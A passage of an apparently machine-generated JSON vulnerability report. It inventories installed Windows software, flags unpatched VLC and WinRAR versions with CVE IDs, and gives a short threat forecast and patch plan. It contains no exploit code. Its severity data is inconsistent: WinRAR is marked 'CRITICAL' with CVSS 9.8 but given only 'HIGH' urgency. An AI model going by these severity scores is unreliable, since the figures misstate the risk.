        "version": "16.0.20326.20144",
        "publisher": "Microsoft Corporation",
        "has_cve": false,
        "cve_id": null,
        "severity": null
      },
      {
        "name": "Microsoft Office Professional Plus 2016 - en-us",
        "version": "16.0.20326.20144",
        "publisher": "Microsoft Corporation",
        "has_cve": false,
        "cve_id": null,
        "severity": null
      },
      {
        "name": "scilab-2026.0.1 (64-bit)",
        "version": "2026.0.1",
        "publisher": "Dassault Syst\u00e8mes",
        "has_cve": false,
        "cve_id": null,
        "severity": null
      },
      {
        "name": "Microsoft Visio Professional 2016 - en-us",
        "version": "16.0.20326.20144",
        "publisher": "Microsoft Corporation",
        "has_cve": false,
        "cve_id": null,
        "severity": null
      },
      {
        "name": "VLC media player",
        "version": "3.0.7",
        "publisher": "VideoLAN",
        "has_cve": true,
        "cve_id": "CVE-2023-47359",
        "severity": "MEDIUM"
      },
      {
        "name": "WinRAR 5.91 (64-bit)",
        "version": "5.91.0",
        "publisher": "win.rar GmbH",
        "has_cve": true,
        "cve_id": "CVE-2023-38831",
        "severity": "CRITICAL"
      },
      {
        "name": "Application Verifier x64 External Package (DesktopEditions)",
        "version": "10.1.26100.8249",
        "publisher": "Microsoft",
        "has_cve": false,
        "cve_id": null,
        "severity": null
      },
      {
        "name": "Python 3.14.5 Executables (64-bit)",
        "version": "3.14.5150.0",
        "publisher": "Python Software Foundation",
        "has_cve": false,
        "cve_id": null,
        "severity": null
      },
      {
        "name": "Microsoft Windows Application Compatibility Fix Database",
        "version": "1.0.0",
        "publisher": "System Provider",
        "has_cve": false,
        "cve_id": null,
        "severity": null
      },
      {
        "name": "Microsoft Visual C++ 2022 X64 Debug Runtime - 14.51.36231",
        "version": "14.51.36231",
        "publisher": "Microsoft Corporation",
        "has_cve": false,
        "cve_id": null,
        "severity": null
      },
      {
        "name": "Python 3.14.5 Tcl/Tk Support (64-bit)",
        "version": "3.14.5150.0",
        "publisher": "Python Software Foundation",
        "has_cve": false,
        "cve_id": null,
        "severity": null
      },
      {
        "name": "Application Verifier x64 External Package (OnecoreUAP)",
        "version": "10.1.26100.8249",
        "publisher": "Microsoft",
        "has_cve": false,
        "cve_id": null,
        "severity": null
      },
      {
        "name": "Microsoft Visual C++ 2022 X64 Minimum Runtime - 14.51.36231",
        "version": "14.51.36231",
        "publisher": "Microsoft Corporation",
        "has_cve": false,
        "cve_id": null,
        "severity": null
      },
      {
        "name": "Python 3.14.5 Development Libraries (64-bit)",
        "version": "3.14.5150.0",
        "publisher": "Python Software Foundation",
        "has_cve": false,
        "cve_id": null,
        "severity": null
      },
      {
        "name": "VMware Workstation",
        "version": "17.6.4",
        "publisher": "VMware, Inc.",
        "has_cve": false,
        "cve_id": null,
        "severity": null
      },
      {
        "name": "Microsoft Visual Studio Installer",
        "version": "4.6.58.48107",
        "publisher": "Microsoft Corporation",
        "has_cve": false,
        "cve_id": null,
        "severity": null
      },
      {
        "name": "Python 3.14.5 pip Bootstrap (64-bit)",
        "version": "3.14.5150.0",
        "publisher": "Python Software Foundation",
        "has_cve": false,
        "cve_id": null,
        "severity": null
      },
      {
        "name": "Microsoft Visual C++ 2022 X64 Additional Runtime - 14.51.36231",
        "version": "14.51.36231",
        "publisher": "Microsoft Corporation",
        "has_cve": false,
        "cve_id": null,
        "severity": null
      },
      {
        "name": "Windows App Certification Kit Native Components",
        "version": "10.1.26100.8249",
        "publisher": "Microsoft Corporation",
        "has_cve": false,
        "cve_id": null,
        "severity": null
      },
      {
        "name": "Universal CRT Tools x64",
        "version": "10.1.26100.8249",
        "publisher": "Microsoft Corporation",
        "has_cve": false,
        "cve_id": null,
        "severity": null
      },
      {
        "name": "Office 16 Click-to-Run Extensibility Component",
        "version": "16.0.20326.20072",
        "publisher": "Microsoft Corporation",
        "has_cve": false,
        "cve_id": null,
        "severity": null
      },
      {
        "name": "Node.js",
        "version": "24.15.0",
        "publisher": "Node.js Foundation",
        "has_cve": false,
        "cve_id": null,
        "severity": null
      },
      {
        "name": "Windows SDK DirectX x64 Remote",
        "version": "10.1.26100.8249",
        "publisher": "Microsoft Corporation",
        "has_cve": false,
        "cve_id": null,
        "severity": null
      },
      {
        "name": "Python 3.14.5 Standard Library (64-bit)",
        "version": "3.14.5150.0",
        "publisher": "Python Software Foundation",
        "has_cve": false,
        "cve_id": null,
        "severity": null
      },
      {
        "name": "VS Script Debugging Common",
        "version": "16.0.102.0",
        "publisher": "Microsoft Corporation",
        "has_cve": false,
        "cve_id": null,
        "severity": null
      },
      {
        "name": "Microsoft Teams Meeting Add-in for Microsoft Office",
        "version": "1.26.21803",
        "publisher": "Microsoft",
        "has_cve": false,
        "cve_id": null,
        "severity": null
      },
      {
        "name": "Microsoft Update Health Tools",
        "version": "4.75.0.0",
        "publisher": "Microsoft Corporation",
        "has_cve": false,
        "cve_id": null,
        "severity": null
      },
      {
        "name": "Application Verifier x64 External Package",
        "version": "10.1.19041.5609",
        "publisher": "Microsoft",
        "has_cve": false,
        "cve_id": null,
        "severity": null
      },
      {
        "name": "MongoDB 8.2.1 2008R2Plus SSL (64 bit)",
        "version": "8.2.1",
        "publisher": "MongoDB Inc.",
        "has_cve": false,
        "cve_id": null,
        "severity": null
      },
      {
        "name": "Update for x64-based Windows Systems (KB5001716)",
        "version": "8.94.0.0",
        "publisher": "Microsoft Corporation",
        "has_cve": false,
        "cve_id": null,
        "severity": null
      },
      {
        "name": "Python 3.14.5 Core Interpreter (64-bit)",
        "version": "3.14.5150.0",
        "publisher": "Python Software Foundation",
        "has_cve": false,
        "cve_id": null,
        "severity": null
      },
      {
        "name": "Apple Mobile Device Support",
        "version": "19.4.0.10",
        "publisher": "Apple Inc.",
        "has_cve": false,
        "cve_id": null,
        "severity": null
      },
      {
        "name": "Python 3.14.5 Documentation (64-bit)",
        "version": "3.14.5150.0",
        "publisher": "Python Software Foundation",
        "has_cve": false,
        "cve_id": null,
        "severity": null
      },
      {
        "name": "Python 3.14.5 Test Suite (64-bit)",
        "version": "3.14.5150.0",
        "publisher": "Python Software Foundation",
        "has_cve": false,
        "cve_id": null,
        "severity": null
      },
      {
        "name": "Python 3.14.5 Add to Path (64-bit)",
        "version": "3.14.5150.0",
        "publisher": "Python Software Foundation",
        "has_cve": false,
        "cve_id": null,
        "severity": null
      },
      {
        "name": "Visual Studio Build Tools 2019",
        "version": "16.11.52",
        "publisher": "Microsoft Corporation",
        "has_cve": false,
        "cve_id": null,
        "severity": null
      },
      {
        "name": "Visual Studio Build Tools 2026",
        "version": "18.6.0",
        "publisher": "Microsoft Corporation",
        "has_cve": false,
        "cve_id": null,
        "severity": null
      },
      {
        "name": "3uTools",
        "version": "9.08.006",
        "publisher": "Shenzhen Aidapu Network Technology Co.,Ltd.",
        "has_cve": false,
        "cve_id": null,
        "severity": null
      },
      {
        "name": "Copilot",
        "version": "153.0.4234.48",
        "publisher": "Microsoft Corporation",
        "has_cve": false,
        "cve_id": null,
        "severity": null
      },
      {
        "name": "Microsoft Edge",
        "version": "153.0.4234.32",
        "publisher": "Microsoft Corporation",
        "has_cve": false,
        "cve_id": null,
        "severity": null
      },
      {
        "name": "Microsoft Edge WebView2 Runtime",
        "version": "153.0.4234.32",
        "publisher": "Microsoft Corporation",
        "has_cve": false,
        "cve_id": null,
        "severity": null
      },
      {
        "name": "psqlODBC 13.02.0000",
        "version": "13.02.0000-1",
        "publisher": "EnterpriseDB",
        "has_cve": false,
        "cve_id": null,
        "severity": null
      },
      {
        "name": "Universal CRT Redistributable",
        "version": "10.0.26624",
        "publisher": "Microsoft Corporation",
        "has_cve": false,
        "cve_id": null,
        "severity": null
      }
    ]
  },
  "threat_forecast": [
    {
      "vector": "Archive Weaponization Phishing (CVE-2023-38831)",
      "probability": "CRITICAL",
      "reasoning": "Unpatched WinRAR allows attackers to execute arbitrary reverse shells disguised as innocuous image or document archives.",
      "mitigation": "Update WinRAR to 6.24+ or enable strict endpoint email attachment filtering for compressed files."
    }
  ],
  "remediation_plan": [
    {
      "action": "Patch VLC media player: CVE-2023-47359 (CVSS 6.5)",
      "details": "Update VLC Media Player to 3.0.19+.",
      "urgency": "MEDIUM"
    },
    {
      "action": "Patch WinRAR 5.91 (64-bit): CVE-2023-38831 (CVSS 9.8)",
      "details": "Upgrade WinRAR to version 6.24 or higher immediately.",
      "urgency": "HIGH"
    }
  ]
};
